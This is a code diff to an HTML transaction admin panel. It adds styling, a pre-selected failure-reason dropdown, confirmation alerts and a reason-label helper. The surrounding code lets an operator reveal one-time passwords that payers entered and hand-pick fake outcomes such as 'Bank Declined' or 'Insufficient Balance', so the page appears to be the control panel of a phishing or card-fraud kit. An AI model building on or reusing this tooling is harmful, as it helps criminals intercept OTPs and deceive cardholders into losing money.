@@ -35,6 +35,26 @@
     .show-otp-btn:disabled { background: #666; }
     .wrong-otp-btn { background: #ef4444; }
     .wrong-otp-btn:hover { background: #dc2626; }
+    .reason-dropdown { 
+      background: #333; 
+      color: #fff; 
+      border: 1px solid #555; 
+      padding: 4px 8px; 
+      border-radius: 4px;
+      width: 100%;
+      margin-bottom: 5px;
+    }
+    .fail-btn {
+      background: #ef4444;
+      width: 100%;
+      padding: 4px 0;
+      margin-top: 5px;
+    }
+    .fail-btn:hover { background: #dc2626; }
+    .reason-container {
+      margin-top: 8px;
+      width: 100%;
+    }
   </style>
 </head>
 <body>
@@ -165,15 +185,15 @@
                 <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                   Success
                 </button>
-                <div class="mt-2">
-                  <select id="reason-${tx.id}" class="bg-gray-800 text-white text-xs p-1 border border-gray-600 rounded">
-                    <option value="insufficient_balance">Insufficient Balance</option>
-                    <option value="bank_declined">Bank Declined</option>
-                    <option value="card_disabled">Card Disabled</option>
-                    <option value="invalid_card">Invalid Card</option>
+                <div class="reason-container">
+                  <select id="reason-${tx.id}" class="reason-dropdown">
+                    <option value="insufficient_balance" ${tx.failureReason === 'insufficient_balance' ? 'selected' : ''}>Insufficient Balance</option>
+                    <option value="bank_declined" ${tx.failureReason === 'bank_declined' || !tx.failureReason ? 'selected' : ''}>Bank Declined</option>
+                    <option value="card_disabled" ${tx.failureReason === 'card_disabled' ? 'selected' : ''}>Card Disabled</option>
+                    <option value="invalid_card" ${tx.failureReason === 'invalid_card' ? 'selected' : ''}>Invalid Card</option>
                   </select>
                   <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
-                    class="bg-red-500 hover:bg-red-600">
+                    class="fail-btn">
                     Fail
                   </button>
                 </div>
@@ -197,6 +217,7 @@
           body: JSON.stringify({ invoiceId: id, redirectStatus: status })
         });
         if (!response.ok) throw new Error('Failed to update status');
+        alert(`Transaction marked as ${status}`);
         loadTransactions();
       } catch (error) {
         console.error('Error updating status:', error);
@@ -207,6 +228,7 @@
     async function updateStatusWithReason(id, status) {
       const reasonSelect = document.getElementById(`reason-${id}`);
       const failureReason = reasonSelect.value;
+      
       try {
         const response = await fetch("/api/updateRedirectStatus", {
           method: "POST",
@@ -214,11 +236,25 @@
           body: JSON.stringify({ invoiceId: id, redirectStatus: status, failureReason })
         });
         if (!response.ok) throw new Error('Failed to update status with reason');
+        
+        // Show a short confirmation message
+        alert(`Transaction marked as failed with reason: ${getReadableReason(failureReason)}`);
         loadTransactions();
       } catch (error) {
         console.error('Error updating status with reason:', error);
         alert('Failed to update status with reason');
       }
+    }
+
+    // Helper function to get readable reason text
+    function getReadableReason(reasonCode) {
+      const reasons = {
+        'insufficient_balance': 'Insufficient Balance',
+        'bank_declined': 'Bank Declined',
+        'card_disabled': 'Card Disabled',
+        'invalid_card': 'Invalid Card'
+      };
+      return reasons[reasonCode] || reasonCode;
     }
 
     async function showOTP(id) {
